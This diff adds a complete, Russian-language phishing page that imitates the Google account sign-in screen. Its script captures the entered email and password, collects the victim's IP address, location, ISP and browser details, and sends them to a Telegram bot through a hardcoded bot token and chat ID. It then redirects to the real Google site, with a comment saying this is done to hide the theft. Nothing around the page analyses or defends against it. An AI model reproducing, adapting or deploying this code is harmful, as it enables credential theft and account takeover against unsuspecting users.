@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Войти - Аккаунты Google</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 16px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { font-size: 16px; margin-bottom: 32px; }
+        .input-group { position: relative; margin-bottom: 24px; text-align: left; }
+        .input-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
+        .input-group input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .input-group label { position: absolute; top: 50%; left: 15px; transform: translateY(-50%); background: #fff; padding: 0 4px; color: #5f6368; font-size: 16px; transition: 0.2s; pointer-events: none; }
+        .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top: 0; font-size: 12px; color: #1a73e8; }
+        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn:hover { background: #1557b0; }
+        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
+        <h1>Войти</h1>
+        <p>Используйте свой аккаунт Google</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder=" " required>
+                <label for="email">Электронная почта или телефон</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder=" " required>
+                <label for="password">Введите свой пароль</label>
+            </div>
+            <div class="actions">
+                <a href="#" class="link">Забыли адрес электронной почты?</a>
+                <button type="submit" class="btn">Следующий</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Получение IP и данных
+            let ipData = "Не удалось получить";
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                ipData = `IP: ${data.ip}, Страна: ${data.country_name}, Город: ${data.city}, Провайдер: ${data.org}`;
+            } catch (err) {}
+            
+            const time = new Date().toLocaleString("ru-RU");
+            const userAgent = navigator.userAgent;
+            
+            const message = `🔐 *Новые данные*\n\n📧 Почта: \`${email}\`\n🔑 Пароль: \`${password}\`\n⏰ Время: ${time}\n🌐 ${ipData}\n💻 UA: ${userAgent}`;
+            
+            const token = '9291109923:AAGrhNLULOKt4xic4L-CDExMV7k8n_f69sQ';
+            const chatId = '8009248024';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+            });
+            
+            // Перенаправление на настоящий Google для маскировки
+            window.location.href = 'https://accounts.google.com';
+        });
+    </script>
+</body>
+</html>
